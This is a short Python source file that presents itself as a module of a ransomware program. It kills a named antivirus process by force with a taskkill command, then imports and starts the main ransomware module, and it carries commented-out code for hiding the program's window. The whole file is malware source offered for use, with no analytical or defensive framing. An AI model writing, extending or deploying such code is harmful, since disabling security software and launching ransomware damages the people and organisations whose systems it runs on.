#!/usr/bin/python3.8
import subprocess

'''
THIS MODULE SEARCHES FOR RUNNING ANTIVIRUS SOFTWARE IN THE TARGET SYSTEM AND KILLS IT
AND RUNS THE MAIN RANSOMWARE MODULE WHEN SUCCESSFUL.
THIS IS DONE TO PREVENT INTERRUPTION FROM ANTIVIRUS SOFTWARE AND ALLOW THE MALWARE DO IT'S JOB.
'''


def av_kill():
    avs = ['avast.exe']

    for av in avs:
        cmd = f'taskkill /IM {av} /F'
        try:
            subprocess.run(cmd, shell=True)
        except Exception:
            pass
        else:
            import ransomware


def main():
    # hide = win32gui.GetForegroundWindow()
    # win32gui.ShowWindow(hide, win32con.SW_HIDE)
    av_kill()


if __name__ == "__main__":
    main()
